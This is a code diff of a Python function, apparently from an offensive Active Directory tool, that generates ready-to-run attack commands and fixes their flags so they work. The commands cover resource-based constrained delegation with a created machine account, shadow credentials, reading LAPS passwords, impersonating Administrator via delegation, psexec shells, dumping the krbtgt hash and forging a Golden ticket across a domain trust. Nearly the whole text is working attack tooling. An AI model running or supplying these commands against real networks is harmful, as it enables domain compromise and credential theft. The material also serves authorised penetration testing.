@@ -225,9 +225,9 @@ def get_commands(
                     [
                         f"# Option 1 — Resource-Based Constrained Delegation (needs MachineAccountQuota>0):",
                         f"impacket-addcomputer '{D}/{A}:{PASS}' -computer-name 'PWNED$' -computer-pass 'Pwn3dP@ss' -dc-ip {DC}",
-                        f"rbcd.py -f 'PWNED$' -t '{T}' -dc-ip {DC} '{D}/{A}:{PASS}'",
-                        f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' '{D}/PWNED$:Pwn3dP@ss' -dc-ip {DC}",
-                        f"export KRB5CCNAME='Administrator@cifs_{TF}@{D.upper()}.ccache'",
+                        f"rbcd.py -action write -delegate-from 'PWNED$' -delegate-to '{T}$' -dc-ip {DC} '{D}/{A}:{PASS}'",
+                        f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' -outfile administrator.ccache '{D}/PWNED$:Pwn3dP@ss' -dc-ip {DC}",
+                        f"export KRB5CCNAME=administrator.ccache",
                         f"impacket-psexec -k -no-pass '{D}/Administrator@{TF}'",
                         f"# Option 2 — shadow credentials (any case, no MAQ needed):",
                         f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T}$' --action add --dc-ip {DC}",
@@ -351,7 +351,7 @@ def get_commands(
             return CommandSet(
                 f"Read the LAPS local admin password for {TF}.",
                 [
-                    f"impacket-GetLAPSPassword '{D}/{A}:{PASS}@{DC}' -computer-name '{T}'",
+                    f"impacket-GetLAPSPassword '{D}/{A}:{PASS}@{DC}' -computer '{T}'",
                     f"pyLAPS --action get -c '{T}' -d {D} -u '{A}' -p '{PASS}' --dc-ip {DC}",
                     f"# PowerShell:",
                     f"Get-ADComputer -Identity '{T}' -Properties 'ms-Mcs-AdmPwd' | Select -Expand 'ms-Mcs-AdmPwd'",
@@ -363,8 +363,8 @@ def get_commands(
                 f"Constrained delegation — impersonate Administrator on {TF}.",
                 [
                     f"# Note: SPN must match an entry in msDS-AllowedToDelegateTo (often cifs/, host/, http/).",
-                    f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' '{D}/{A}:{PASS}' -dc-ip {DC}",
-                    f"export KRB5CCNAME='Administrator@cifs_{TF}@{D.upper()}.ccache'",
+                    f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' -outfile administrator.ccache '{D}/{A}:{PASS}' -dc-ip {DC}",
+                    f"export KRB5CCNAME=administrator.ccache",
                     f"impacket-psexec -k -no-pass '{D}/Administrator@{TF}'",
                 ],
             ), na
@@ -376,10 +376,10 @@ def get_commands(
                     f"# 1. Create a controlled computer account (needs MachineAccountQuota>0):",
                     f"impacket-addcomputer '{D}/{A}:{PASS}' -computer-name 'PWNED$' -computer-pass 'Pwn3dP@ss' -dc-ip {DC}",
                     f"# 2. Set msDS-AllowedToActOnBehalfOfOtherIdentity on {TF}:",
-                    f"rbcd.py -f 'PWNED$' -t '{T}' -dc-ip {DC} '{D}/{A}:{PASS}'",
+                    f"rbcd.py -action write -delegate-from 'PWNED$' -delegate-to '{T}$' -dc-ip {DC} '{D}/{A}:{PASS}'",
                     f"# 3. Get a service ticket as Administrator:",
-                    f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' '{D}/PWNED$:Pwn3dP@ss' -dc-ip {DC}",
-                    f"export KRB5CCNAME='Administrator@cifs_{TF}@{D.upper()}.ccache'",
+                    f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' -outfile administrator.ccache '{D}/PWNED$:Pwn3dP@ss' -dc-ip {DC}",
+                    f"export KRB5CCNAME=administrator.ccache",
                     f"impacket-psexec -k -no-pass '{D}/Administrator@{TF}'",
                 ],
             ), na
@@ -410,7 +410,7 @@ def get_commands(
             return CommandSet(
                 f"Domain trust — {TF} trusts the current domain. Forge inter-realm TGT (SID-history attack).",
                 [
-                    f"# 1. Get the trust key (NTLM hash of the trust account):",
+                    f"# 1. Get the krbtgt hash of the source domain (used to forge a Golden TGT with extra-sid):",
                     f"impacket-secretsdump -just-dc-user '{D}\\krbtgt' '{D}/{A}:{PASS}@{DC}'",
                     f"# 2. Forge a Golden TGT impersonating Administrator with extra-sid pointing to target's DA SID:",
                     f"impacket-ticketer -nthash '<KRBTGT_NTLM>' -domain-sid '<SRC_DOMAIN_SID>' -domain {D} -extra-sid '<DST_DOMAIN_SID>-519' -spn 'krbtgt/{TF}' Administrator",
